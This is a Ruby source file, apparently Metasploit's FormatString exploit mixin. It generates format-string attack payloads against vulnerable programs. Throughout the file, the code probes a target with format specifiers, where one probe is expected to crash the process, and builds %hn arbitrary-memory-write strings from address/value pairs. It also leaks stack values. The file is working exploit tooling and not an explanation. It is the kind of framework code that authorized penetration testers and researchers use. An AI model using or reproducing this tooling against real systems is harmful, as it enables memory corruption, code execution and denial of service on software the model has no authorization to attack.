# -*- coding: binary -*-
module Msf

###
#
# This mixin provides an interface to generating format string exploits
# in a more intelligent way.
#
# Author: jduck
###

module Exploit::FormatString

  #
  # Creates an instance of a format string exploit
  #
  def initialize(info = {})
    super

    @use_fpu = false
    @use_dpa = false
  end


  #
  # Allow caller to override the capabilities
  #
  def fmtstr_set_caps(fpu, dpa)
    @use_fpu = fpu
    @use_dpa = dpa
  end

  #
  # Detect the capabilities (only works for non-blind)
  #
  def fmtstr_detect_caps
    @use_dpa = fmtstr_detect_cap_dpa
    @use_fpu = fmtstr_detect_cap_fpu
    #print_status("support dpa:#{@use_dpa.to_s}, fpu:#{@use_fpu.to_s}")
  end

  def fmtstr_detect_cap_dpa
    res = trigger_fmt("|%1$08x|")
    return nil if not res
    res = extract_fmt_output(res)
    if res =~ /^\|[0-9a-f]{8}\|$/
      return true
    end
    return false
  end

  def fmtstr_detect_cap_fpu
    res = trigger_fmt("|%g|")
    return nil if not res
    res = extract_fmt_output(res)
    if res =~ /^\|[\-0-9]+\.[0-9]+\|$/
      return true
    end
    return false
  end

  def fmtstr_detect_vulnerable
    res = trigger_fmt("|%08x|")
    return false if not res
    res = extract_fmt_output(res)
    if res =~ /^\|[0-9a-f]{8}\|$/
      return true
    end
    return false
  end

  # NOTE: This will likely crash the target process
  def fmtstr_detect_exploitable
    begin
      res = trigger_fmt("|" + ("%n" * 16) + "|")
    rescue ::Exception
      res = nil
    end
    return true if not res
    res = extract_fmt_output(res)
    if res =~ /^\|\|$/
      return true
    end
    return false
  end


  #
  # Generates a format string that will perform an arbitrary write using
  # two separate short values
  #
  def generate_fmt_two_shorts(num_printed, write_to, write_what, targ = target)

    arr = Array.new
    arr << [ write_what & 0xffff, write_to ]
    arr << [ write_what >> 16, write_to + 2 ]

    stuff = fmtstr_gen_from_array(num_printed, arr, targ)
  end

  #
  # Generates a format string that will perform an arbitrary write using
  # two separate short values
  #
  def generate_fmtstr_from_buf(num_printed, write_to, buffer, targ = target)

    # break buffer into shorts
    arr = fmtstr_gen_array_from_buf(write_to, buffer, targ)

    # now build the format string in its entirety
    stuff = fmtstr_gen_from_array(num_printed, arr, targ)
  end


  #
  # Generates and returns an array of what/where pairs from the supplied buffer
  #
  def fmtstr_gen_array_from_buf(write_to, buffer, targ = target)

    # break buffer into shorts
    arr = Array.new
    off = 0
    if ((buffer.length % 2) == 1)
      buffer << rand_text(1)
    end
    while off < buffer.length
      # convert short to number
      tb = buffer[off,2].unpack('v')[0].to_i
      #print_status("%d %d %d" % [off,buffer.length,tb])
      addr = write_to + off

      arr << [ tb, addr ]
      off += 2
    end
    return arr
  end

  #
  # Generates a format string from an array of value/address pairs
  #
  def fmtstr_gen_from_array(num_printed, arr, targ = target)
    num_pops = targ['NumPops']
    num_pad = targ['PadBytes'] || 0

    # sort the array -- for optimization
    arr = arr.sort { |x,y| x[0] <=> y[0] }

    # build up the addrs and fmts buffers
    fmts = ""
    addrs = ""
    num = fmtstr_count_printed(num_printed, num_pad, num_pops, arr)
    arr.each do |el|
      # find out how much to advance the column value
      prec = fmtstr_target_short(el[0], num)

      # for non-dpa, if the prec is more than 8, we need something to pop
      if not @use_dpa and prec >= 8
        addrs << rand_text(4)
      end

      # write here!
      addrs << [el[1]].pack('V')

      # put our advancement fmt (or bytes)
      fmts << fmtstr_advance_count(prec)

      # fmt to cause the write :)
      if @use_dpa
        fmts << "%" + num_pops.to_s + "$hn"
        num_pops += 1
      else
        fmts << "%hn"
      end

      # update written count
      num = el[0]
    end

    # make sure we dont have bad characters ...
    if (bad_idx = Rex::Text.badchar_index(addrs, payload_badchars))
      raise BadcharError.new(addrs, bad_idx, addrs.length, addrs[bad_idx]),
        "The format string address area contains invalid characters.",
        caller
    end

    # put it all together
    stuff = rand_text(num_pad)
    stuff << addrs
    if not @use_dpa
      stuff << "%8x" * num_pops
    end
    stuff << fmts

    return stuff
  end


  #
  # Count how many bytes will print before we reach the writing..
  #
  def fmtstr_count_printed(num_printed, num_pad, num_pops, arr)

    num = num_printed + num_pad
    if not @use_dpa
      num += (8 * num_pops)
    end
    npr = num
    arr.each do |el|
      prec = fmtstr_target_short(el[0], npr)
      # this gets popped in order to advance the column (dpa doesn't need these)
      if not @use_dpa and prec >= 8
        num += 4
      end

      # account for the addr to write to
      num += 4
      npr = el[0]
    end
    return num
  end

  #
  # Generate the number to be used for precision that will create
  # the specified value to write
  #
  def fmtstr_target_short(value, num_printed)
    if value < num_printed
      return (0x10000 - num_printed) + value
    end
    return value - num_printed
  end

  #
  # Generate a fmt that will advance the printed count by the specified amount
  #
  def fmtstr_advance_count(prec)

    # no need to advance :)
    return "" if prec == 0

    # assuming %x max normal length is 8...
    if prec >= 8
      return "%0" + prec.to_s + "x"
    end

    # anything else, we just put some chars in...
    return rand_text(prec)
  end


  #
  # Read a single 32-bit integer from the stack at the specified offset
  #
  def fmtstr_stack_read(offset, extra = '')

    # cant read offset 0!
    return nil if offset < 1

    fmt = ''
    fmt << extra
    if @use_dpa
      fmt << "|%" + offset.to_s + "$x"
    else
      x = offset
      if @use_fpu and x >= 2
        fmt << "%g" * (x/2)
        x %= 2;
      end
      fmt << "%x" * (x-1)
      fmt << "|"
      fmt << "%x"
    end

    res = trigger_fmt(fmt)
    return res if not res

    numstr = extract_fmt_output(res)
    dw = numstr.split('|')[1].to_i(16)
  end

end

end
